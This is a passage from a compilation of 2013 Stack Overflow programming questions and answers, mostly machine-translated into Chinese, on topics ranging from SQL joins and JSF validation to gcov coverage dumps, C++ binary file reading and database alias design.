FROM tblSystemAdministratorGroups refGroup
JOIN tblGroup refMem ON refGroup.AttributeValue = refMem.ObjectUID 
```

此查询将返回所有管理员组。下一步将是获取这些组的成员。由于我有 2 种类型的成员资格（显式、计算），我将不得不使用 a`LEFT JOIN`来确保我没有排除任何行。

```
SELECT refGroup.*
FROM tblSystemAdministratorGroups refGroup
-- The JOIN bellow can be excluded but it is here just to clarify the architecture
JOIN tblGroup refMem ON refGroup.AttributeValue = refMem.ObjectUID
LEFT JOIN tblGroup_ComputedMember cm ON refMem.ObjectUID = cm.GroupObjectID
LEFT JOIN tblGroup_ExplicitMember em ON refMem.ObjectUID = em.GroupObjectID 
```

拼图的最后一块是获取每个成员的最新版本。为此，我将不得不使用`JOIN`排除旧版本：

```
JOIN (
    SELECT MAX([ID]) MaxId 
    FROM [OmadaReporting].[dbo].tblGroup_ComputedMember 
    GROUP BY ObjectID  
) MostRecentCM ON MostRecentCM.MaxId = cm.Id 
```

和

```
JOIN (
    SELECT MAX([ID]) MaxId 
    FROM [OmadaReporting].[dbo].tblGroup_ExplicitMember 
    GROUP BY ObjectID  
) MostRecentEM ON MostRecentEM.MaxId = em.Id 
```

完整的查询将是：

```
SELECT refGroup.*
FROM tblSystemAdministratorGroups refGroup
JOIN tblGroup refMem ON refGroup.AttributeValue = refMem.ObjectUID
LEFT JOIN tblGroup_ComputedMember cm ON refMem.ObjectUID = cm.GroupObjectID
JOIN (
    SELECT MAX([ID]) MaxId 
    FROM [OmadaReporting].[dbo].tblGroup_ComputedMember 
    GROUP BY ObjectID  
) MostRecentCM ON MostRecentCM.MaxId = cm.Id
LEFT JOIN tblGroup_ExplicitMember em ON refMem.ObjectUID = em.GroupObjectID
JOIN (
    SELECT MAX([ID]) MaxId 
    FROM [OmadaReporting].[dbo].tblGroup_ExplicitMember 
    GROUP BY ObjectID  
) MostRecentEM ON MostRecentEM.MaxId = em.Id 
```

问题很清楚：`JOIN`排除旧版本的 2 也适用于 select 语句，显然没有返回任何行。逃避这种情况并返回预期值的最佳解决方案是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-20T10:19:43.530

在最后两个连接中使用 LEFT 连接怎么样？

```
LEFT JOIN (
    SELECT MAX([ID]) MaxId 
    FROM [OmadaReporting].[dbo].tblGroup_ComputedMember 
    GROUP BY ObjectID  
) MostRecentCM ON MostRecentCM.MaxId = cm.Id 
```

然后在 Where 子句中过滤值如下：

```
WHERE MostRecentCM.MaxId IS NOT NULL 
      OR
      MostRecentEM.MaxId IS NOT NULL 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-20T10:29:50.923

```
SELECT refGroup.*
FROM tblSystemAdministratorGroups refGroup
JOIN tblGroup refMem ON refGroup.AttributeValue = refMem.ObjectUID
LEFT JOIN (
    select GroupObjectID, ID, max(ID) over (partition by ObjectID) as maxID
    from tblGroup_ComputedMember
) cm ON refMem.ObjectUID = cm.GroupObjectID and cm.ID = cm.maxID
LEFT JOIN (
    select GroupObjectID, ID, max(ID) over (partition by ObjectID) as maxID
    from tblGroup_ExplicitMember
) em ON refMem.ObjectUID = em.GroupObjectID and em.ID = em.maxID
where cm.ID = cm.MaxID 
```

# jsf - 知道哪个验证在请求上下文回调中有错误

> ID：14977242
> 
> 赞同：0
> 
> 时间：2013-02-20T10:13:13.400
> 
> 标签：jsf, primefaces

在我的表格上

```
<h:inputText id="name" value="#{pointController.selected.name}" title="#{bundle.CreatePointTitle_name}" required="true" />

<h:inputText id="term" value="#{pointController.selected.term}" title="#{bundle.CreatePointTitle_term}" required="true" />

<p:commandButton styleClass="btn btn-primary" action="#{pointController.create}" value="#{bundle.CreatePointSaveLink}" oncomplete="handleComplete(xhr, status, args)" /> 
```

javascript

```
function handleComplete(xhr, status, args) {  
    if(args.validationFailed) {  
        alert("failed");
    }  
} 
```

我如何知道哪些输入字段未输入或存在验证问题？

# php - 统计 Facebook 帖子上的点赞数

> ID：14977244
> 
> 赞同：0
> 
> 时间：2013-02-20T10:13:26.447
> 
> 标签：php, facebook, post, facebook-like

我是 facebook 编程的新手，并试图阅读某些帖子上的点赞数。

```
"data": [
{
  "likes": {
    "data": [
      {
        "name": "xxx", 
        "id": "10005270697255"
      }
    ], 
    "count": 1
  }, 
  "id": "100005270197255_103639323125074", 
  "created_time": "2013-02-19T17:13:25+0000"
}, 
```

我如何从“计数”中获取数字？:)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-20T10:17:46.770

怎么样`data['likes']['count']`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-08T03:17:25.560

您没有显示整个数据结构，但是一旦有了`data`，它应该是：

```
data[0].likes.count 
```

# eclipse - Eclipse - 更改问题视图操作

> ID：14977251
> 
> 赞同：1
> 
> 时间：2013-02-20T10:13:38.643
> 
> 标签：eclipse, eclipse-plugin, eclipse-rcp

我目前正在开发 eclipse 插件。我正在使用构建器和标记，并且我已经实现了一个重命名参与者，它在其中检查有效的文件名（不包含任何特殊字符，假设有效的文件名是字母数字正则表达式）。当用户在工作台内工作时，它工作正常。比如说，当用户直接进入文件系统并更改文件名时。我也为这种情况实施了标记。它将显示项目中相应文件的问题标记，说明“输入的文件无效 - {filename}”

是否有可能更改在问题视图中单击相应问题标记时的操作。说，如果出现这样的重命名问题标记，我想打开重命名资源对话框，而不是在单击视图中的问题时打开相应的文件。对此有任何帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-20T16:14:19.567

尽管这不会改变标记的双击行为，但您可以按照 Eclipse[标记解析帮助](http://help.eclipse.org/juno/index.jsp?topic=/org.eclipse.platform.doc.isv/guide/wrkAdv_markerresolution.htm)中的描述为用户提供快速修复，并从您提供的 IMarkerResolutionGenerator 中显示重命名资源对话框。

# iphone - 将数据动态绑定到 icarousel

> ID：14977253
> 
> 赞同：1
> 
> 时间：2013-02-20T10:13:40.200
> 
> 标签：iphone, ios, xcode, coverflow, icarousel

我正在使用 icarousel 在我的项目中显示封面流。我使用 uiview 作为包含标签和图像视图的轮播项目。轮播的数据来自对 Web 服务的调用，我将该数据绑定到我用作轮播项目的 uiview 的标签和图像视图。现在的问题是，由于来自 Web 服务的数据很大，因此加载数据并将其绑定到 icarousel 需要很长时间，它几乎冻结了我的应用程序。现在我想要的是异步下载数据并将其绑定到 icarousel 所以它会立即显示，用户不必等到从服务器下载所有数据。

任何帮助将不胜感激..谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-29T15:44:08.083

我建议使用 AFNetworking 之类的东西来执行异步数据的检索。一旦你得到响应，迭代你得到的所有数据对象并`[carousel insertItemAtIndex:index animated:YES];`像这样调用：

```
@interface ViewController ()

@property (nonatomic, retain) NSMutableArray *items;

@end

// This is a sample function, actual implementation will look different for you
- (void)callBackFromAsyncWebService:(NSArray*)data 
{
    for (id dataObj in data) {
        [self insertItem:dataObj];
    }
}

- (NSUInteger)numberOfItemsInCarousel:(iCarousel *)carousel
{
    return [items count];
}

- (IBAction)insertItem:(id)item
{
    NSInteger index = MAX(0, carousel.currentItemIndex);
    [items insertObject:item atIndex:index];
    [carousel insertItemAtIndex:index animated:YES];
} 
```

# procdump - ARM设备的procdump？或者我如何捕捉 ARM 设备中的崩溃？

> ID：14977254
> 
> 赞同：1
> 
> 时间：2013-02-20T10:13:41.870
> 
> 标签：procdump

我必须在 ARM 设备上捕获特定应用程序的崩溃。procdump 适用于 x86 和 x64 架构，但不能在 ARM 上运行。任何指针？

# json - Asp.Net Web Api & JSON.Net - 将正文反序列化为 .Net 通用对象

> ID：14977256
> 
> 赞同：2
> 
> 时间：2013-02-20T10:13:42.603
> 
> 标签：json, list, dictionary, asp.net-web-api

我想将正文反序列化为 .net 类（字典和列表）。

（所以我的代码对 xml 和 json 是透明的）

```
public HttpResponseMessage Post([FromBody]IDictionary<string, object> body)
        {
        } 
```

目前我使用转换器来处理嵌套字典反序列化。

```
class IDictionaryConverter : CustomCreationConverter<IDictionary<string, object>>
{
    public override IDictionary<string, object> Create(Type objectType)
    {
        return new Dictionary<string, object>();
    }

    public override bool CanConvert(Type objectType)
    {
        // in addition to handling IDictionary<string, object>
        // we want to handle the deserialization of dict value
        // which is of type object
        return objectType == typeof(object) || base.CanConvert(objectType);
    }

    public override object ReadJson(JsonReader reader, Type objectType, object existingValue, JsonSerializer serializer)
    {
        if (reader.TokenType == JsonToken.StartObject || reader.TokenType == JsonToken.Null)
            return base.ReadJson(reader, objectType, existingValue, serializer);

        // if the next token is not an object
        // then fall back on standard deserializer (strings, numbers etc.)
        return serializer.Deserialize(reader);
    }
} 
```

但是嵌套的 JLists 不会转换为 List。也许我可以创建一个 IListConverter，但有更好的方法吗？

我希望在我的 web api 中只有一个代码。不：如果 json 那样做，如果 xml 那样做......

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T13:48:06.090

这解决了我的问题：

```
class IDictionaryConverter : CustomCreationConverter<IDictionary<string, object>>
    {
        public override IDictionary<string, object> Create(Type objectType)
        {
            return new Dictionary<string, object>();
        }

        public override bool CanConvert(Type objectType)
        {
            // in addition to handling IDictionary<string, object>
            // we want to handle the deserialization of dict value
            // which is of type object
            return objectType == typeof(object) || base.CanConvert(objectType);
        }

        public override object ReadJson(JsonReader reader, Type objectType, object existingValue, JsonSerializer serializer)
        {
            if (reader.TokenType == JsonToken.StartObject || reader.TokenType == JsonToken.Null)
                return base.ReadJson(reader, objectType, existingValue, serializer);

            if (reader.TokenType == JsonToken.StartArray)
                return serializer.Deserialize<IList<object>>(reader);

            // if the next token is not an object
            // then fall back on standard deserializer (strings, numbers etc.)
            return serializer.Deserialize(reader);
        }
    } 
```

# css - 为什么我不能将动作选择器与后代元素一起使用

> ID：14977257
> 
> 赞同：1
> 
> 时间：2013-02-20T10:13:42.870
> 
> 标签：css, google-chrome

这是一个简单的 HTML，我认为它是简单的 CSS（请注意，两个项目是链接，两个不是）：

```
<html>
  <head>
    <style>
      li.menu:hover {
        background-color: #0ff;
      }

      li.menu a {
        background-color: #0f0;
      }

      li.menu a:hover {
        background-color: #00f;
      }
    </style>
  </head>
  <body>
    <ul>
      <li class="menu"><a>item1</a></li>
      <li class="menu"><a>item2</a></li>
      <li class="menu">item3</li>
      <li class="menu">item4</li>
    <ul>
  </body>
</html> 
```

现在，在 Firefox 中，这可以按我的预期工作，但在 Chrome (v24) 中却没有。

我希望 item1 和 item2`#0f0`在未悬停时具有（绿色）颜色，并且`#00f`在悬停时具有（蓝色）颜色。但它们总是绿色的（在 Chrome 中）！那么为什么`:hover`对 item3 和 item4 有效，而对 item1 和 item2 无效呢？

有没有一种方法也可以在 Chrome 中使用，并且仍然如此简单？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-20T15:54:45.893

定义`li:hover a:hover`它应该可以工作。

# c# - 将数据从 JQuery 传递到 MVC3 控制器

> ID：14977261
> 
> 赞同：0
> 
> 时间：2013-02-20T10:13:50.033
> 
> 标签：c#, jquery, asp.net-mvc

我有一个要求，在哪里根据用户输入进行搜索，用户可以动态添加搜索行

```
<tr id="tblNewContentRow">
<td>
@Html.TextBox("txtNewAttributes", "", new { @class = "alphaonly", style = "width: 155px;" })
</td>
<td>
@{@Html.DropDownList("ddlNewValues", Model.OperandsMaxList, new { style = "height: 20px;" })
}
</td>
<td colspan="2">
@Html.TextBox("txtNewValues", "", new { @class = "numbersonly", style = "width: 250px;" })
 </td>
</tr> 
```

和添加按钮动态生成该行下方的类似行（我使用了 Jquery）用户想要的行数。

当用户点击提交时，我想查询此属性（文本框、下拉列表、文本框）以获取数据库中的列表。我可以使用 Ajax 调用传递这些数据。

我的问题是如何将这些 json 中的多个值发送到控制器，以便我可以轻松地映射和检索值

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-20T10:35:47.057

var data=('#form_id').serializeArray();

然后将此“数据”作为属性发送，并期望在控制器中输入字符串 []。整个数据将传递给控制器

干杯帕尼*

# django - 运行 zc.buildout 时出现 AssertionError

> ID：14977263
> 
> 赞同：0
> 
> 时间：2013-02-20T10:13:54.410
> 
> 标签：django, buildout

我在使用 buildout 时遇到问题。我下载 bootstrap.py 使用，

```
wget http://downloads.buildout.org/2/bootstrap.py 
```

构建.cfg

```
[buildout]
parts = python
        django
develop = .
eggs = beautifulsoup
       .....

[python]
recipe = zc.recipe.egg
interpreter = python
eggs = ${buildout:eggs}

[django]
recipe = djangorecipe
wsgi = true
eggs = ${buildout:eggs} 
```

当我尝试**./bin/buildout**时。我收到以下错误。

```
Upgraded:
  distribute version 0.6.35;
restarting.
Generated script '/home/tests/myproject/bin/buildout'.
Develop: '/home/tests/myproject/.'
While:
  Installing.
  Processing develop directory '/home/tests/myproject/.'.

An internal error occured due to a bug in either zc.buildout or in a
recipe being used:
Traceback (most recent call last):
  File "/home/tests/myproject/eggs/zc.buildout-2.0.1-py2.7.egg/zc/buildout/buildout.py", line 1808, in main
    getattr(buildout, command)(args)
  File "/home/tests/myproject/eggs/zc.buildout-2.0.1-py2.7.egg/zc/buildout/buildout.py", line 468, in install
    installed_develop_eggs = self._develop()
  File "/home/tests/myproject/eggs/zc.buildout-2.0.1-py2.7.egg/zc/buildout/buildout.py", line 709, in _develop
    zc.buildout.easy_install.develop(setup, dest)
  File "/home/tests/myproject/eggs/zc.buildout-2.0.1-py2.7.egg/zc/buildout/easy_install.py", line 862, in develop
    return _copyeggs(tmp3, dest, '.egg-link', undo)
  File "/home/tests//eggs/zc.buildout-2.0.1-py2.7.egg/zc/buildout/easy_install.py", line 803, in _copyeggs
    assert len(result) == 1, str(result)
AssertionError: [] 
```

任何人都可以帮我解决它。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T10:27:36.760

你真的想用 virtualenv 设置运行它；在基于包的操作系统（例如 Debian、Ubuntu、RedHat 等）上，您很容易在系统安装版本的分发、easy_install 和其他第 3 方包之间遇到冲突，以及构建需要什么（参见[http://workaround .org/easy-install-debian](http://workaround.org/easy-install-debian)了解原因）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-08-16T14:26:56.443

这里的问题不是 buildout，而是 setuptools：它被分成了distribute 和 setuptools，然后两者结合，进一步发展。未来看起来很适合 setuptools。但过去的幽灵仍在追捕我们。

[下载 bootstrap.py 获取最新的 setuptools](https://gist.githubusercontent.com/jensens/9226657/raw/f78186f55ee9536af0a5ce2a9a7617a7dde53d28/bootstrap.py)

将 zc.buildout 固定到 >= 2.2.1，将 setuptools 固定到 >= 2.2 - 将版本部分添加到 buildout.cfg：

```
[versions]
zc.buildout = >= 2.2.1
setuptools = >= 2.2 
```

使用带有参数的 virtualenv >=1.9.1`--no-setuptools`所以运行：

```
virtualenv --no-setuptools env
./env/bin/python bootstrap.py
./bin/buildout 
```

# php - PHP自动邮件发送

> ID：14977265
> 
> 赞同：-3
> 
> 时间：2013-02-20T10:13:57.860
> 
> 标签：php, mysql, email, mail-server

如何在应用程序中使用 PHP 在月底生成自动邮件发送逻辑？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T10:36:50.660

您应该在这里使用 cron 作业。

开发一个脚本以在月底发送电子邮件并通过 cron 作业运行它。

另请访问[如何使用 php 通过 cron 作业发送电子邮件](https://stackoverflow.com/questions/3368307/how-to-send-emails-via-cron-job-usng-php-mysql)的链接。以及[如何设置 cron 作业。](http://www.unixgeeks.org/security/newbie/unix/cron-1.html)

# php - Joomla getApplication中的参数“站点”是什么意思？

> ID：14977269
> 
> 赞同：6
> 
> 时间：2013-02-20T10:14:11.433
> 
> 标签：php, joomla

```
$a = JFactory::getApplication('site'); 
```

我在 Joomla API 中遇到了这个：

```
static JApplication getApplication ([mixed $id = null], [array $config = array()], [string $prefix = 'J']) 
```

$id、$config 和 $prefix 的例子是什么？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-02-20T13:12:25.793

`$id`可以是`'site'`或`'administrator'`。如果您不设置它，那么如果您在后端，`JFactory::getApplication('administrator')`将返回并`JFactory::getApplication('site')`用于前端。

取决于`$id`，要么`/administrator/includes/application.php`被包含，要么只是`includes/application.php`。

使用`$config`您可以设置配置文件的名称、会话名称会话等。

前缀是类名前缀。所有核心 Joomla 类都以 J 为前缀，这就是为什么它是默认设置。例如`JAdministrator`.

看看[http://joomlacode.org/gf/project/joomla/scmsvn/?action=browse&path=/development/tags/1.6.x/1.6.3/libraries/joomla/application/application.php&view=markup](http://joomlacode.org/gf/project/joomla/scmsvn/?action=browse&path=/development/tags/1.6.x/1.6.3/libraries/joomla/application/application.php&view=markup) for`__construct`和`getInstance`方法`JApplication`for 更多细节

# actionscript-3 - 我们如何使用 Feathers UI 开发 Web 和桌面应用程序？

> ID：14977271
> 
> 赞同：1
> 
> 时间：2013-02-20T10:14:25.077
> 
> 标签：actionscript-3, apache-flex, web-applications, desktop-application

我找到了使用 Feathers UI 开发 Actionscript 移动应用程序的教程，是否可以使用 Feathers UI 做 Actionscript Web 应用程序和桌面应用程序？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-20T10:33:21.877

当然。“适用于移动和桌面应用程序的轻量级、可换肤和可扩展的 UI 控件。”

Feathers 用于 Starling 2D 框架，因此您需要了解如何使用它。

虽然 Feathers 似乎更针对 AIR Mobile 部署，但它仍可用于针对 Flash Player 并部署在 Web 上。

# jsf - 根据存储在数据库中的消息属性键显示标签

> ID：14977275
> 
> 赞同：1
> 
> 时间：2013-02-20T10:14:29.667
> 
> 标签：jsf, internationalization, primefaces, facelets, el

我正在显示数据库中的标签值，该值在表单上正确显示。要求是我想以多种语言显示表单并为其创建了一个属性文件。有什么办法，我们可以从数据库中检索消息属性键并根据 .properties 文件中的值显示标签。

例如。目前，数据库中 field_label 的值为制造商。我可以将消息属性键存储在 Database 中，例如 msg.manufacturer 并从 .properties 文件中获取相应的值。

```
 -- msg.properties --
msg.manufacturer = fabricante

--XHTML--                   
<p:dataTable id="resultTable" var="result" value="#{RequestBean.dependentFields}">
<p:column>
<f:facet name="header">
<h:outputText value=" " />
</f:facet>
<h:outputText value="#{result.field_label}"/>
</p:column> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T12:22:21.403

您可以使用大括号表示法`[]`来引用 EL 中的动态 bean/map/resource 属性。

如果这`#{msg}`是您的资源包文件，则应该这样做：

```
<h:outputText value="#{msg[result.field_label]}"/> 
```

# php - 将代码段添加到类中

> ID：14977276
> 
> 赞同：0
> 
> 时间：2013-02-20T10:14:29.527
> 
> 标签：php

我有一些在我的购物车应用程序中使用的功能：

```
session_start();

if(!isset($_SESSION['products'], $_SESSION['price'], $_SESSION['product_names'],$_SESSION['product_id'])) {
     $_SESSION['products'] = 0;
     $_SESSION['price'] = 0;
     $_SESSION['product_names'] = array();
     $_SESSION['product_id'] = array();
}
if(isset($_POST['add'])) {
      $_SESSION['product_names'][] = $_POST['product_name']; 
      $_SESSION['products']++;
      $_SESSION['price'] += $_POST['price'];
}
if(isset($_POST['empty'])) {
      session_destroy();
      header('Location:index.php');
} 
```

问题是，我怎样才能将它添加到一个类中并在我的视图页面中调用它？

我的意思是它仍然可以作为`<?php echo $_SESSION['price']?>`. 我怎样才能使这项工作？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T11:17:43.387

试试这门课，你做错了。

```
session_start();    
class Shopping {

    public function __construct()
    {

    }

    //get cart products
    public function getCartProducts()
    {
        $cart = array();
        if(isset($_SESSION['cart'])) {

            $cart = unserialize($_SESSION['cart']);
        }
        return $cart;
    }

    //add product to cart
    public function addToCart($product_details)
    {
        $cart = $this->getCartProducts();
        $product_id = $product_details['product_id'];
        $is_quantity = $this->addQuantity($product_id); //check if product already exists in session if then increase the quantity
        if(!$is_quantity) {
            $product_details = array(
                                'qty' => $product_details['qty'],
                                'price' => $product_details['price'],
                                'product_name' => $product_details['name'],
                                'product_id' => $product_id
            );
            array_push($cart, $product_details);
            $_SESSION['cart'] = serialize($cart);
        }
    }

    //add quantity if product already exists
    private function addQuantity($product_id)
    {

        $cart = $this->getCartProducts();
        $i = 0;
        foreach ($cart as $product) {
            if($product['product_id'] == $product_id)
            {
                $product['qty'] += 1;
                $cart[$i] = $product;
                $_SESSION['cart'] = serialize($cart);
                return true;
            }
            $i++;
        }
        return false;
    }

    public function clearCart()
    {
        unset($_SESSION['cart']);
    }

    public function removeProduct($product_id)
    {
        $cart = $this->getCartProducts();
        $new_cart = array();
        foreach ($cart as $product) {
            if($product['product_id'] != $product_id)
                array_push($new_cart, $product);
        }
        $_SESSION['cart'] = serialize($new_cart);
    }
}

$shop = new Shopping();
$shop->addToCart(array('product_id'=>1,'name'=>'test 1','price'=>'120.00','qty'=>1));
$shop->addToCart(array('product_id'=>3,'name'=>'test 2','price'=>'120.00','qty'=>1)); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-20T10:20:57.927

这是我在课堂上使用会话的方法的一个示例。[参考](http://www.php.net/manual/en/language.references.pass.php)工作很好。

```
 class Cart {
      private $container ;
      public function __construct(&$container){
        if (!isset($container) || !is_array($container))
          $session['cart'] = array() ;
        $this->container = &$container ; 
      }

      public function productExists($id){
        return (isset($this->container[$id])) ;
      }
    }

    $cart = new Cart($_SESSION['cart']) ; 
```

此时容器中的所有更改都可以在`$_SESSION['cart']`. 会话数组的其余部分不受影响，应该是安全的。

# objective-c - 在 Objective-C 中，为什么在分配给指定类型的变量时需要强制转换？

> ID：14977284
> 
> 赞同：2
> 
> 时间：2013-02-20T10:14:40.383
> 
> 标签：objective-c

这种类型转换的使用出现了很多，例如在按钮点击动作中：

```
UIButton *button = (UIButton *)sender; 
```

我的问题是为什么需要显式强制转换“（UIButton *）”。将“sender”的值分配给变量“button”是否已经有效地将其转换为指向 UIButton 的指针？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-20T10:17:11.277

它告诉编译器你知道你在做什么：“我知道`sender` *技术上*不是，`UIButon*`但我保证它总是在运行时。”

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-20T10:25:10.210

在objective-c中，通常会编写动作方法，例如

```
- (void)didAction:(id)sender 
```

该方法可以被任何对象（例如 UIButton、UIControl 等）调用，并期望设置发送者自己。

曾经的对象是一个 id。因此，在该方法中，您有一个 id 类型的变量。如果您确定它是一个按钮，那么您可以转换为 UIButton。

另一种方法是，如果您确定该方法将仅由 UIButton 实例调用，那么您可以将您的操作方法更改为

```
- (void)didAction:(UIButton *)senderButton 
```

如果这样做，则无需进行投射。

请注意，对于您负责的那种铸件，没有任何问题。如果您不确定，您可以随时检查对象的类别

```
- (BOOL)isKindOfClass:(Class)aClass 
```

方法。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-02-20T11:39:58.180

正如斯蒂芬所说，这并不是真正需要的。

但这是一个风格和良好商业惯例的问题。

顺便说一句，当您省略它时，您会收到警告，而不是错误。只是为了摆脱警告，你可以简单地做：

```
someObject = (id) anotherObject; 
```

这将适用于对任何类的任何对象的引用。您会看到几乎没有任何铸造实际完成。您总是可以在不强制转换的情况下分配给超类：

```
objectOfAClass = objectOfSubclassOfA; 
```

底线是，它通过迫使你思考一个非常简短的时刻来思考你在那里实际做的事情，从而帮助你避免错误。

# c - 在运行时转储 gcov 数据

> ID：14977285
> 
> 赞同：3
> 
> 时间：2013-02-20T10:14:41.530
> 
> 标签：c, code-coverage, gcov

我正在使用 gcov 为我正在处理的 C 项目收集代码覆盖率数据。我知道一旦程序完成后退出，gcov 就会转储代码覆盖率数据。如何为长时间运行的进程收集 gcov 数据。（比如说，我的程序是在永不关闭的服务器中运行的操作系统的内核——我需要为它收集代码覆盖率数据）。有什么方法可以定期（例如，每 1 小时）或在某些事件时生成 gcov 转储代码覆盖率数据 - 我如何触发 gcov 转储代码覆盖率数据（而不是在程序终止后等待 gcov 执行它）？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-20T10:33:39.430

`__gcov_flush()`定期打电话。

这可以通过关联[信号处理程序](http://en.wikipedia.org/wiki/C_signal_handling)来完成：

```
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>

void __gcov_flush();

static void catch_function(int signal) {
   __gcov_flush();
}

int main(void) {
    if (signal(SIGINT, catch_function) == SIG_ERR) {
        fputs("An error occurred while setting a signal handler.\n", stderr);
        return EXIT_FAILURE;
    }
    while(1);
} 
```

定期编译：`gcc sig.c -ftest-coverage -fprofile-arcs`
然后切换（定期）更新`kill -2 process_id`

# c++ - 从二进制文件c ++中读取值时出错

> ID：14977291
> 
> 赞同：0
> 
> 时间：2013-02-20T10:14:56.460
> 
> 标签：c++, io, binary

// 数组值是经过几次计算后设置的

```
 long int a1[356];
 long int b2[356];
 long int c3[356]; 
```

// 写入二进制文件

```
ofstream output("h.h",ios::binary|ios::out|ios::app);

output.write((char*)a1,356*4);
output.write((char*)b2,356*4);
output.write((char*)c3,356*4); 
```

// 读为

```
long int *x=new long int[1424];
ifstream in("h.h",ios::binary|ios::in);

in.read((char*)x,1424);

vector<long int> e1;
vector<long int> e2;
vector<long int> e3;

for(int y=;y<=1424;y=y+4)
{
 // e1.push_back((int)x[i]);

} 
```

我正在使用上述方法读取写入二进制文件的整数，因为我无法检索存储的值。. 有人可以指出问题出在哪里吗？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T10:17:56.693

和

```
long int *x=new long int[1424]; 
```

您声明一个指向 1424 数组的指针`long int`。但随着阅读

```
in.read((char*)x,1424); 
```

您正在阅读 1424*字节*。

在循环中，您循环遍历数组，但将 4 添加到索引，因此只有每四个元素`x`被推回。

* * *

您应该首先考虑在 64 位机器上可能`long`是*8个字节。*您也不需要动态分配数组。并且该数组应包含 356 个条目，就像您将其写入文件时一样。然后，您可以`sizeof(x)`在 read 调用中读取字节。最后在循环中，您从 0 循环到`sizeof(x) / sizeof(x[0])`：

```
long int x[356];
ifstream in("h.h",ios::binary|ios::in);

in.read((char*) x, sizeof(x));

for(int y = 0; y < (sizeof(x) / sizeof(x[0])); y++)
{
} 
```

* * *

~~如果您想将内容读`long int`入 a `std::vector`，实际上有一种“更简单”的方式，使用迭代器和标准 C++ 算法：~~

 ~~```
std::vector<long int> e1;

std::ifstream in("h.h", std::ios::binary | std::ios::in);

std::copy_n(std::istream_iterator<long int>(in),
            356,
            std::back_inserter(e1)); 
```~~ 

上述语句声明了一个向量，打开一个文件，并将文件中的 356`long int`个条目复制到向量`e1`中。

~~有关参考，请参阅[`std::istream_iterator`](http://en.cppreference.com/w/cpp/iterator/istream_iterator)、[`std::back_inserter`](http://en.cppreference.com/w/cpp/iterator/back_inserter)，当然还有[`std::copy_n`](http://en.cppreference.com/w/cpp/algorithm/copy_n)。~~

* * *

上面的 C++ 解决方案不起作用，所以我尝试了另一个：

```
std::vector<long> v(356);

std::ifstream in("h.h", std::ios::binary);

std::for_each(std::begin(v), std::end(v), [&in](long& v) {
    in.read(reinterpret_cast<char*>(&v), sizeof(v));
}); 
```

上面的解决方案已经用[这个程序](http://pastebin.com/77rHLAY2)测试过了，它对我有用。

上述语句的目的是创建一个包含 356`long`个条目的向量，打开文件，并一次将一个条目读入向量。

# database - Spare parts Database (structure)

> ID：14977293
> 
> 赞同：1
> 
> 时间：2013-02-20T10:14:58.500
> 
> 标签：database, database-design, data-structures

There is a database of spare parts for cars, and online search by the name of spare parts. The user can type in the search, for example "safety cushion" or "airbag" - and the search result should be the same.

Therefore, I need somehow to implement the aliases for names of spare parts, and the question is how to store them in the database? Until now I have only one option that comes in mind - to create an additional table

```
| id | name of part   | alias_id |
-------------------------------------------------- ---------------
| 1  | airbag         | 10       |
| 2  | safety cushion | 10       | 
```

And add additional field "alias_id" to table containing all the spare parts, and search by this field...

Are there other better options?

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-20T10:42:32.230

Your solution looks fine for the exact problem you described.

BUT what if someone writes safetycushion? or safety cuschion? With these kinds of variations your alias lookup table will soon become huge and and manualy maintaining these will not be feasible.

At that point you'll need a completely different approach (think full text search engine).

So *if* you are still sure you only need a couple of aliases your approach seems to be fine.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-20T10:44:41.217

If I have understood correctly, it's best to have 3 tables in a many to many situation (if multiple parts have multiple aliases:

Table - Parts

```
| id | name of part   |
-----------------------
| 1  | airbag         |
| 2  | safety cushion | 
```

Table - Aliases

```
| id | name of alias  |
-----------------------
| 10 | AliasName      | 
```

Table - PartToAliases

```
| id | PartId | AliasId |
-------------------------
| 1  | 1      | 10      |
| 2  | 2      | 10      | 
```

# unit-testing - When do BDD scenarii become too much specific?

> ID：14977296
> 
> 赞同：2
> 
> 时间：2013-02-20T10:15:06.287
> 
> 标签：unit-testing, bdd, specflow

After a very inspiring training about TDD and BDD, I try to implement the methodology, using `MSTest` and `Specflow`. But I have a question where I'm stuck to:

I've written Acceptance Tests to validate a subsystem that we are working on. Our system is a little distributed:

*   there is a 3rd party computer
*   with its own application running freely
*   with a third party database that we are accessing through tcp/ip

However **my Specflow Scenario seems too much specialized for my own development set-up**: it contains inputs that are valid only for me. In the example below, the ip adress is accessible mostly from me. And the target directory is namely a directory on my machine.

The accredited Tester/Validator, or the Product owner are likely not be able to launch the same test scenario, since they won't have access to this machine. But my developper colleages may not either.

```
@lastOne
Scenario: Get lattest 3rdParty OCR Data into specified directory
Given I indicate 'database' as the databaseName of third party computer
And I indicate '12.126.42.21' as the ipAddress of the third party computer
And I indicate 'user' as the databaseUser in third party computer
And I indicate 'c:\Temp\test_ocr\' as the destination path where to put the ocr data
And I indicate '2013020800009E' as the truck identifier to be associated with ocr data
When I call the OCR Application program
Then the destination path should contain correctly named xml file, with validated xml data, and jpg files about ocr data. 
```

